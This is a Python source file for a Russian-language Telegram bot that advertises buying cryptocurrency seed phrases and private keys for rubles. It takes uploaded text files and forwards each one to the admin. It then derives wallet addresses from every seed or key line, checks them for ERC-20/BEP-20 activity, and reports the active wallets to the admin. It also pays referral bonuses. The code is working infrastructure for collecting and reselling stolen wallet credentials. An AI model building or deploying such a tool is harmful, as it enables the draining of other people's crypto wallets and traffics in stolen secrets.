# main.py
import asyncio
import os
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, Document
from aiogram.filters import CommandStart
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.client.default import DefaultBotProperties
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN"))

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

from database import (
    init_db, get_or_create_user, register_referral, is_duplicate,
    add_wallet_hash, update_user_stats, get_user, get_stats,
    get_referral_count, get_referral_earnings, add_referral_bonus,
    hash_line
)
from wallet_utils import seed_to_address, private_key_to_address
from rpc_client import has_erc20_or_bep20_activity

class UploadFile(StatesGroup):
    waiting_file = State()

class SupportState(StatesGroup):
    waiting_for_message = State()

class WithdrawState(StatesGroup):
    waiting_for_amount = State()
    waiting_for_address = State()

class AdminState(StatesGroup):
    waiting_for_password = State()

# Клавиатуры
main_menu = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="📂 Отправить файл", callback_data="upload")],
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
        [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals")],
        [InlineKeyboardButton(text="💰 Баланс", callback_data="balance")],
        [InlineKeyboardButton(text="💳 Вывести", callback_data="withdraw")],
        [InlineKeyboardButton(text="📞 Поддержка", callback_data="support")],
        [InlineKeyboardButton(text="ℹ️ Правила", callback_data="rules")],
    ]
)

admin_panel = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="📤 Заявки на вывод", callback_data="admin_withdrawals")],
        [InlineKeyboardButton(text="🔙 Выход", callback_data="admin_logout")]
    ]
)

back_menu = InlineKeyboardMarkup(
    inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="back")]]
)

@dp.message(CommandStart())
async def start_cmd(message: Message):
    args = message.text.split()
    referrer_id = None
    if len(args) > 1:
        payload = args[1]
        if payload.startswith("ref_"):
            try:
                referrer_id = int(payload.replace("ref_", ""))
            except:
                pass

    await get_or_create_user(message.from_user.id, message.from_user.username or "unknown")
    if referrer_id:
        await register_referral(message.from_user.id, referrer_id)

    ref_link = f"https://t.me/your_bot_username_bot?start=ref_{message.from_user.id}"
    text = (
        "👋 <b>Добро пожаловать!</b>\n\n"
        "🛒 <b>Скупка SEED-фраз и Private-ключей</b> с транзакциями в сетях:\n"
        "• <b>ERC-20 (Ethereum)</b>\n"
        "• <b>BEP-20 (BNB Smart Chain)</b>\n\n"
        "💰 <b>Цены:</b>\n"
        "• 🌱 SEED-фраза — <b>235₽</b>\n"
        "• 🔑 Private-key — <b>145₽</b>\n\n"
        "💸 <b>ПЛАТИМ САМУЮ ВЫСОКУЮ ЦЕНУ</b> + <b>70% от отработки</b> помимо прайса!\n\n"
        "🔝 <b>Наши преимущества:</b>\n"
        "├ 🤖 Автоматизация\n"
        "├ ⚡ Быстрые выплаты\n"
        "├ 🚀 Высокая скорость\n"
        "└ 🔍 Глубокая проверка\n\n"
        "🕒 <b>Выплаты каждый день в 23:00 (МСК)</b>\n"
        "Все заработанные средства будут отправлены автоматически."
    )
    await message.answer(text, reply_markup=main_menu)

@dp.callback_query(F.data == "upload")
async def upload_file_cb(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "📂 Загрузите файл в формате <b>.txt</b>.\n\n"
        "📌 Поддерживается до <b>20 МБ</b>.\n"
        "🔍 Проверка: уникальность + активность"
    )
    await state.set_state(UploadFile.waiting_file)
    await callback.answer()

@dp.message(UploadFile.waiting_file, F.document)
async def process_file(message: Message, state: FSMContext):
    document: Document = message.document

    # Для админа: список активных кошельков
    active_lines = []

    # Отправляем файл админу
    user_info = f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id}"
    try:
        await bot.send_message(ADMIN_ID, f"📩 Файл от {user_info}\n📄 {document.file_name}")
        await bot.send_document(ADMIN_ID, document.file_id)
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"❌ Не удалось отправить файл: {e}")

    # Проверка расширения
    if not document.file_name.endswith(".txt"):
        await message.answer("❌ Файл должен быть в формате <b>.txt</b>.")
        await state.clear()
        return

    msg = await message.answer("📥 Скачиваю файл...")

    try:
        file = await bot.get_file(document.file_id)
        max_size = 20 * 1024 * 1024
        if file.file_size > max_size:
            await message.answer("❌ Файл слишком большой. Максимум — 20 МБ.")
            await state.clear()
            return

        file_data = (await bot.download_file(file.file_path)).getvalue()

        if len(file_data) >= 100 and b'\x00' in file_data[:100]:
            await message.answer("❌ Это не текстовый файл.")
            await state.clear()
            return

        try:
            content = file_data.decode("utf-8")
        except UnicodeDecodeError:
            try:
                content = file_data.decode("cp1251")
            except UnicodeDecodeError:
                content = file_data.decode("utf-8", errors="replace")

    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")
        await state.clear()
        return

    lines = [line.strip() for line in content.splitlines() if line.strip()]
    total_lines = len(lines)
    if total_lines == 0:
        await message.answer("❌ Файл пуст.")
        await state.clear()
        return

    progress_msg = await message.answer(f"🔄 Обработка строк...\n✅ Обработано: 0 / {total_lines} (0%)")

    new_seeds = 0
    new_keys = 0
    total_reward = 0

    for i, line in enumerate(lines, 1):
        address = None
        is_valid = False

        word_count = len(line.split())
        if word_count in (12, 24) and all(w.isalnum() for w in line.split()):
            address = seed_to_address(line)
            wallet_type = 'seed'
            price = 235
        elif len(line) == 64 and all(c in "0123456789abcdefABCDEF" for c in line):
            address = private_key_to_address(line)
            wallet_type = 'key'
            price = 145
        else:
            continue

        if not address:
            continue

        h = hash_line(line)
        if await is_duplicate(h):
            continue

        if await has_erc20_or_bep20_activity(address):
            await add_wallet_hash(h, wallet_type, message.from_user.id)
            if wallet_type == 'seed':
                new_seeds += 1
            else:
                new_keys += 1
            total_reward += price
            is_valid = True
            active_lines.append(f"{address} | {wallet_type.upper()} | +{price}₽")

        if i % 5 == 0 or i == total_lines:
            percent = (i / total_lines) * 100
            try:
                await progress_msg.edit_text(
                    f"🔄 Обработка строк...\n"
                    f"✅ Обработано: {i} / {total_lines} ({int(percent)}%)"
                )
            except:
                pass

    if active_lines:
        filename = f"active_{message.from_user.id}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("Активные кошельки (адрес | тип | оплата)\n")
            f.write("="*50 + "\n")
            f.write("\n".join(active_lines))
        try:
            await bot.send_message(ADMIN_ID, "✅ Найдены активные кошельки:")
            await bot.send_document(ADMIN_ID, document=open(filename, "rb"))
            os.remove(filename)
        except Exception as e:
            await bot.send_message(ADMIN_ID, f"❌ Ошибка: {e}")
    else:
        await bot.send_message(ADMIN_ID, "❌ Активных кошельков не найдено.")

    if new_seeds or new_keys:
        await update_user_stats(message.from_user.id, total_lines, new_seeds, new_keys, total_reward)
        user = await get_user(message.from_user.id)
        if user and user['referred_by']:
            bonus = total_reward * 0.1
            await add_referral_bonus(user['referred_by'], bonus)
            try:
                await bot.send_message(user['referred_by'], f"🎉 Реферал заработал {total_reward}₽\n💸 Вам +{bonus:.2f}₽")
            except: pass

    if total_reward > 0:
        text = (
            f'✅ Файл <b>"{document.file_name}"</b> обработан!\n\n'
            f"📊 Найдено:\n"
            f"   • 🌱 SEED: <b>{new_seeds}</b> × 235₽\n"
            f"   • 🔑 Keys: <b>{new_keys}</b> × 145₽\n\n"
            f"📈 Всего строк: <b>{total_lines}</b>\n"
            f"💰 Заработано: <b>{total_reward:.2f} RUB</b>"
        )
    else:
        text = (
            f'⚠️ В файле <b>"{document.file_name}"</b> не найдено активных кошельков.\n\n'
            f"📈 Всего строк: <b>{total_lines}</b>\n"
            "❌ Баланс не пополнен."
        )

    try:
        await progress_msg.edit_text(text)
    except:
        await message.answer(text, reply_markup=main_menu)

    await state.clear()
